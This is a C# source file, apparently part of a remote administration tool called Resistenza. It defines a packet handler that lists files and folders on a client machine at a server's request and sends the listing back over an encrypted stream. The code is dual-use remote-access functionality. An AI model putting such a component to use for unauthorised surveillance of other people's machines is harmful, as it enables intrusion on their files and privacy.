using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.WebSockets;
using System.Text;
using System.Threading.Tasks;

using Resistenza.Common.Networking;
using Resistenza.Common.Packets;

namespace Resistenza.Common.Packets
{
    public class DirectoryDataRequest : IPacket
    {
       
        public string Type { get; set; }
        
        public string Directory { get; set; }
        
        

        public DirectoryDataRequest() {
            Type = this.GetType().ToString();

        }

        // non si può accedere al singleton della classe Client da dentro la funzione, in quanto si incapperebbe in un riferimento di progetti ciclico
        // Resistenza.Client -> Resistenza.Common -> Resistenza.Client...
        //Passare la stream custom dovrebbe bastare
        public async Task HandleAsync(SecureStream ServerStream)
        {
            
            string RequestedDir = Directory;
            var AllEntries = new List<FileSystemEntry>();
            IEnumerable<string> FileEntries = Enumerable.Empty<string>(); ;

            //global struct??

            if (!System.IO.Directory.Exists(RequestedDir))
            {
                var ErrorPkt = new DirectoryDataResponse
                {
                    Error = $"{RequestedDir} doesn't exist.",
                    Directory = Directory
                    

                };
                await ServerStream.SendPacketAsync(ErrorPkt);
                return;
            }

            try
            {
                FileEntries = System.IO.Directory.EnumerateFiles(RequestedDir, "*", new EnumerationOptions
                {
                    IgnoreInaccessible = false,
                    RecurseSubdirectories = false,

                });
            }
            catch (UnauthorizedAccessException)
            {
                var ErrorPkt = new DirectoryDataResponse
                {
                    Error = $"Access to {RequestedDir} is denied.",
                    Directory = Directory


                };
                await ServerStream.SendPacketAsync(ErrorPkt);
                return;
            }

            var DirEntries = System.IO.Directory.GetDirectories(RequestedDir);

            foreach (var FileEntry in FileEntries)
            {
                FileSystemEntry newEntry = new FileSystemEntry();
                FileInfo fileInfo = new FileInfo(FileEntry);

                newEntry.Name = FileEntry.Split("\\").Last();
                newEntry.FileSizeBytes = (int)fileInfo.Length;
                newEntry.LastChange = fileInfo.LastWriteTime.ToString();
                newEntry.IsDirectory = false;
                
                AllEntries.Add(newEntry);
            }

            foreach (var DirEntry in DirEntries)
            {
                FileSystemEntry newEntry = new FileSystemEntry();
                newEntry.Name = DirEntry.Split("\\").Last();
                newEntry.IsDirectory = true;
                AllEntries.Add(newEntry);

            }

            DirectoryDataResponse Pkt = new DirectoryDataResponse
            {
                AllEntries = AllEntries,
                Directory =  Directory
         
            };

            await ServerStream.SendPacketAsync(Pkt);
            

        }

    }
}
